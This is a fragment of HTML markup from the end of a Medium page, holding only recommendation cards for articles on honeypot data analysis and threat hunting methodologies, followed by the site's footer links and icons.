href="https://allenace.medium.com/?source=post_page---read_next_recirc--a4206e8a4bc8----2---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------" rel="noopener follow"><div class="m fr"><img alt="Allen Ace" class="m fk by aei aej de" width="20" height="20" loading="lazy" src="https://miro.medium.com/v2/resize:fill:20:20/1*d314xgZRLVtWSIpQXdOhbQ.jpeg"><div class="gj by m aei aej fw o ak gk"></div></div></a></div></div></div></div></div><div><div class="m" aria-describedby="135" aria-labelledby="135" role="tooltip"><div tabindex="-1" class="bf"><a class="ah ai aj fo al am an ao ap aq ar as at kv ac r" href="https://allenace.medium.com/?source=post_page---read_next_recirc--a4206e8a4bc8----2---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------" rel="noopener follow"><p class="bg b ec ab ga aek gm ael aem aen aeo aep bl">Allen Ace</p></a></div></div></div></div><div class="aer m aes aet aeu aev aew ib"><div class="aex aey aez afa afb afc afd afe"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://allenace.medium.com/introduction-to-honeypot-data-analysis-f25aa5d998de?source=post_page---read_next_recirc--a4206e8a4bc8----2---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------" rel="noopener follow"><div title=""><h2 class="bg jb pt pv aff afg afh afi afj afk gy pw py afl afm afn afo afp afq ha hb hc afr afs aft afu afv afw hd he hf afx afy afz aga agb agc hg hh hi agd age agf agg agh agi hj aep bl">Introduction to Honeypot Data Analysis</h2></div><div class="agj m"><h3 class="bg b hm ab ga agk gm ael agl aen aep eb">In the earlier article, we set up a honeypot in the cloud to gather data from actual cyberattacks. Now the obvious question arises: how…</h3></div></a></div></div><span class="bg b ec ab eb"><div class="wp ac cw ag"><div class="ac r ago"><span>Jan 27</span><div class=""><div class="fr agm do ac r"><div class="fw ht agn ac r ago"><div class="fn do agp m de"></div></div><a class="fw nc agn ac r ago" tabindex="-1" href="https://allenace.medium.com/introduction-to-honeypot-data-analysis-f25aa5d998de?source=post_page---read_next_recirc--a4206e8a4bc8----2---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------" rel="noopener follow"><div><div class="ac" aria-describedby="259" aria-labelledby="259" role="tooltip"><div tabindex="-1" class="bf"><div class="ac r agq"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" aria-labelledby="clap-filled-static-desc" viewBox="0 0 16 16"><desc id="clap-filled-static-desc">A clap icon</desc><path fill="#6B6B6B" fill-rule="evenodd" d="m3.672 10.167 2.138 2.14h-.002c1.726 1.722 4.337 2.436 5.96.81 1.472-1.45 1.806-3.68.76-5.388l-1.815-3.484c-.353-.524-.849-1.22-1.337-.958-.49.261 0 1.56 0 1.56l.78 1.932L6.43 2.866c-.837-.958-1.467-1.108-1.928-.647-.33.33-.266.856.477 1.598.501.503 1.888 1.957 1.888 1.957.17.174.083.485-.093.655a.56.56 0 0 1-.34.163.43.43 0 0 1-.317-.135s-2.4-2.469-2.803-2.87c-.344-.346-.803-.54-1.194-.15-.408.406-.273 1.065.11 1.447.345.346 2.31 2.297 2.685 2.67l.062.06c.17.175.269.628.093.8-.193.188-.453.33-.678.273a.9.9 0 0 1-.446-.273S2.501 6.84 1.892 6.23c-.407-.406-.899-.333-1.229 0-.525.524.263 1.28 1.73 2.691.384.368.814.781 1.279 1.246m8.472-7.219c.372-.29.95-.28 1.303.244V3.19l1.563 3.006.036.074c.885 1.87.346 4.093-.512 5.159l-.035.044c-.211.264-.344.43-.74.61 1.382-1.855.963-3.478-.248-5.456L11.943 3.88l-.002-.037c-.017-.3-.039-.71.203-.895" clip-rule="evenodd"></path></svg><span>317</span></div></div></div></div></a></div></div></div><div class="ac r ags agt"><div class="agr"></div><div class=""><div><div class="bn" aria-describedby="136" aria-labelledby="136" role="tooltip"><div tabindex="-1" class="bf"><span data-dd-action-name="Susi presentation tracker bookmark_preview"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2Ff25aa5d998de&amp;operation=register&amp;redirect=https%3A%2F%2Fallenace.medium.com%2Fintroduction-to-honeypot-data-analysis-f25aa5d998de&amp;source=---read_next_recirc--a4206e8a4bc8----2-----------------bookmark_preview----75793c19_33d1_4bfc_9a40_89e356a0093a--------------" rel="noopener follow"><span class="agr"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="eb ni" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></span></a></span></div></div></div></div></div></div></span><div class="k j e"><div class="xh bi xv ng"></div></div></div></div></div></div></div></div></article></div></div><div class="acf acg ach wx aci acj ack ww acl acm acn aco acp acq acr acs act acu acv acw acx"><div class="acy acz ada adb adc ed m"><article class="ed" data-testid="post-preview"><div class="ed vt m"><div class="bi ed"><div class="ed m"><div class="fr ed add ade adf adg adh adi adj adk adl adm adn ado adp" role="link" data-href="https://asadsyedchi.medium.com/threat-hunting-methodologies-79956229392a" tabindex="0"><div class="adq"><div aria-label="Threat Hunting Methodologies"></div></div><div class="adr ac ci cv"><div class="ac cv zd bi adz aea aeb aec"><div class="aed aee aef aeg aeh ac r"><div class="vl m"><div class="m"><div><div class="m" aria-describedby="137" aria-labelledby="137" role="tooltip"><div tabindex="-1" class="bf"><a tabindex="-1" href="https://asadsyedchi.medium.com/?source=post_page---read_next_recirc--a4206e8a4bc8----3---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------" rel="noopener follow"><div class="m fr"><img alt="Asad Syed" class="m fk by aei aej de" width="20" height="20" loading="lazy" src="https://miro.medium.com/v2/resize:fill:20:20/1*XIoeHEMahH1YMAH1S1VuuA.jpeg"><div class="gj by m aei aej fw o ak gk"></div></div></a></div></div></div></div></div><div><div class="m" aria-describedby="138" aria-labelledby="138" role="tooltip"><div tabindex="-1" class="bf"><a class="ah ai aj fo al am an ao ap aq ar as at kv ac r" href="https://asadsyedchi.medium.com/?source=post_page---read_next_recirc--a4206e8a4bc8----3---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------" rel="noopener follow"><p class="bg b ec ab ga aek gm ael aem aen aeo aep bl">Asad Syed</p></a></div></div></div></div><div class="aer m aes aet aeu aev aew ib"><div class="aex aey aez afa afb afc afd afe"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://asadsyedchi.medium.com/threat-hunting-methodologies-79956229392a?source=post_page---read_next_recirc--a4206e8a4bc8----3---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------" rel="noopener follow"><div title=""><h2 class="bg jb pt pv aff afg afh afi afj afk gy pw py afl afm afn afo afp afq ha hb hc afr afs aft afu afv afw hd he hf afx afy afz aga agb agc hg hh hi agd age agf agg agh agi hj aep bl">Threat Hunting Methodologies</h2></div><div class="agj m"><h3 class="bg b hm ab ga agk gm ael agl aen aep eb">An overview of SOC threat hunting methodologies that use comprehensive hypothesis-driven hunts to raise your organization’s maturity level.</h3></div></a></div></div><span class="bg b ec ab eb"><div class="wp ac cw ag"><div class="ac r ago"><div class="vt ac"><button class="m ak aq ao" aria-label="Member-only story"><div class=""><div><div class="bn" aria-describedby="139" aria-labelledby="139" role="tooltip"><div tabindex="-1" class="bf"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" viewBox="0 0 64 64"><path fill="#FFC017" d="m39.637 40.831-5.771 15.871a1.99 1.99 0 0 1-3.732 0l-5.771-15.87a2.02 2.02 0 0 0-1.194-1.195L7.298 33.866a1.99 1.99 0 0 1 0-3.732l15.87-5.771a2.02 2.02 0 0 0 1.195-1.194l5.771-15.871a1.99 1.99 0 0 1 3.732 0l5.771 15.87a2.02 2.02 0 0 0 1.194 1.195l15.871 5.771a1.99 1.99 0 0 1 0 3.732l-15.87 5.771a2.02 2.02 0 0 0-1.195 1.194"></path></svg></div></div></div></div></button></div><span>Nov 4, 2025</span><div class=""><div class="fr agm do ac r"><div class="fw ht agn ac r ago"><div class="fn do agp m de"></div></div><a class="fw nc agn ac r ago" tabindex="-1" href="https://asadsyedchi.medium.com/threat-hunting-methodologies-79956229392a?source=post_page---read_next_recirc--a4206e8a4bc8----3---------------------75793c19_33d1_4bfc_9a40_89e356a0093a--------------" rel="noopener follow"><div><div class="ac" aria-describedby="260" aria-labelledby="260" role="tooltip"><div tabindex="-1" class="bf"><div class="ac r agq"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="none" aria-labelledby="clap-filled-static-desc" viewBox="0 0 16 16"><desc id="clap-filled-static-desc">A clap icon</desc><path fill="#6B6B6B" fill-rule="evenodd" d="m3.672 10.167 2.138 2.14h-.002c1.726 1.722 4.337 2.436 5.96.81 1.472-1.45 1.806-3.68.76-5.388l-1.815-3.484c-.353-.524-.849-1.22-1.337-.958-.49.261 0 1.56 0 1.56l.78 1.932L6.43 2.866c-.837-.958-1.467-1.108-1.928-.647-.33.33-.266.856.477 1.598.501.503 1.888 1.957 1.888 1.957.17.174.083.485-.093.655a.56.56 0 0 1-.34.163.43.43 0 0 1-.317-.135s-2.4-2.469-2.803-2.87c-.344-.346-.803-.54-1.194-.15-.408.406-.273 1.065.11 1.447.345.346 2.31 2.297 2.685 2.67l.062.06c.17.175.269.628.093.8-.193.188-.453.33-.678.273a.9.9 0 0 1-.446-.273S2.501 6.84 1.892 6.23c-.407-.406-.899-.333-1.229 0-.525.524.263 1.28 1.73 2.691.384.368.814.781 1.279 1.246m8.472-7.219c.372-.29.95-.28 1.303.244V3.19l1.563 3.006.036.074c.885 1.87.346 4.093-.512 5.159l-.035.044c-.211.264-.344.43-.74.61 1.382-1.855.963-3.478-.248-5.456L11.943 3.88l-.002-.037c-.017-.3-.039-.71.203-.895" clip-rule="evenodd"></path></svg><span>5</span></div></div></div></div><div><div class="ac" aria-describedby="140" aria-labelledby="140" role="tooltip"><div tabindex="-1" class="bf"><div class="ac r agq"><svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="#6B6B6B" aria-labelledby="response-filled-16px-desc" viewBox="0 0 16 16"><desc id="response-filled-16px-desc">A response icon</desc><path fill="#6B6B6B" d="M12.344 11.458A5.28 5.28 0 0 0 14 7.526C14 4.483 11.391 2 8.051 2S2 4.483 2 7.527c0 3.051 2.712 5.526 6.059 5.526a6.6 6.6 0 0 0 1.758-.236q.255.223.554.414c.784.51 1.626.768 2.512.768a.37.37 0 0 0 .355-.214.37.37 0 0 0-.03-.384 4.7 4.7 0 0 1-.857-1.958v.014z"></path></svg><span>1</span></div></div></div></div></a></div></div></div><div class="ac r ags agt"><div class="agr"></div><div class=""><div><div class="bn" aria-describedby="141" aria-labelledby="141" role="tooltip"><div tabindex="-1" class="bf"><span data-dd-action-name="Susi presentation tracker bookmark_preview"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://medium.com/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fbookmark%2Fp%2F79956229392a&amp;operation=register&amp;redirect=https%3A%2F%2Fasadsyedchi.medium.com%2Fthreat-hunting-methodologies-79956229392a&amp;source=---read_next_recirc--a4206e8a4bc8----3-----------------bookmark_preview----75793c19_33d1_4bfc_9a40_89e356a0093a--------------" rel="noopener follow"><span class="agr"><svg xmlns="http://www.w3.org/2000/svg" width="25" height="25" fill="none" viewBox="0 0 25 25" class="eb ni" aria-label="Add to list bookmark button"><path fill="currentColor" d="M18 2.5a.5.5 0 0 1 1 0V5h2.5a.5.5 0 0 1 0 1H19v2.5a.5.5 0 1 1-1 0V6h-2.5a.5.5 0 0 1 0-1H18zM7 7a1 1 0 0 1 1-1h3.5a.5.5 0 0 0 0-1H8a2 2 0 0 0-2 2v14a.5.5 0 0 0 .805.396L12.5 17l5.695 4.396A.5.5 0 0 0 19 21v-8.5a.5.5 0 0 0-1 0v7.485l-5.195-4.012a.5.5 0 0 0-.61 0L7 19.985z"></path></svg></span></a></span></div></div></div></div></div></div></span></div></div></div></div></div></div></article></div></div></div><div class="xh bi xv dr ds agu agv agw"></div><a class="bg b bh ab bl uu zy ya zz ni ne uz fc fd fe aba abb abc fh agx agy agz aha ahb fi fj fk bn fl fm" href="https://medium.com/?source=post_page---read_next_recirc--a4206e8a4bc8---------------------------------------" rel="noopener follow"><div class="m fm">See more recommendations</div></a></div></div></div><div class="i l k"><div class="xh bi xv xw"></div><div class="ac ci"><div class="cp bi ih ii ij ik"><div class="xx ac mg kx"><div class="xy xz m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://help.medium.com/hc/en-us?source=post_page-----a4206e8a4bc8---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Help</p></a></div><div class="xy xz m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://status.medium.com/?source=post_page-----a4206e8a4bc8---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Status</p></a></div><div class="xy xz m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://medium.com/about?autoplay=1&amp;source=post_page-----a4206e8a4bc8---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">About</p></a></div><div class="xy xz m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://medium.com/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----a4206e8a4bc8---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Careers</p></a></div><div class="xy xz m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="mailto:pressinquiries@medium.com" rel="noopener follow"><p class="bg b ec ab eb">Press</p></a></div><div class="xy xz m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://blog.medium.com/?source=post_page-----a4206e8a4bc8---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Blog</p></a></div><div class="xy xz m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----a4206e8a4bc8---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Privacy</p></a></div><div class="xy xz m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://policy.medium.com/medium-rules-30e5502c4eb4?source=post_page-----a4206e8a4bc8---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Rules</p></a></div><div class="xy xz m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----a4206e8a4bc8---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Terms</p></a></div><div class="xy m"><a class="ah ai aj fo al am an ao ap aq ar as at au av" href="https://speechify.com/medium?source=post_page-----a4206e8a4bc8---------------------------------------" rel="noopener follow"><p class="bg b ec ab eb">Text to speech</p></a></div></div></div></div></div></div></div></div></div></div></div></div>





































<div height="1" width="1" style="position: absolute; top: 0px; left: 0px; border: none; visibility: hidden;" data-original-tag="iframe"></div>
</body></html>